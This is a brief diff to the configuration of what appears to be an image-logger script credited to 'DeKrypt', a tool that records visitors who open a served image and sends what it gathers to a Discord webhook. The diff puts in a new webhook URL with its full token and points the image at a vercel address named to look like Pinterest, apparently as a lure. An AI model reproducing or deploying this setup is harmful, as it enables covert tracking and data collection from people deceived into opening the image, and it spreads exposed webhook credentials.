@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1383338805121257576/BXEKu4H8FBzpkOEsbabXYNNS4js98V-Ki9dhmcAnHfUHdWEo4AJjQX1x1gTJgP5Z_eJm",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1383683387973304370/xdBEMd_bdwDTuNy7FI0bnFE8ZILmEoO6R6bmQB56M7-veDMbIGKQT3egtAt0Uh7nSl5n",
+    "image": "https://pinterest-wheat.vercel.app/api/image", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
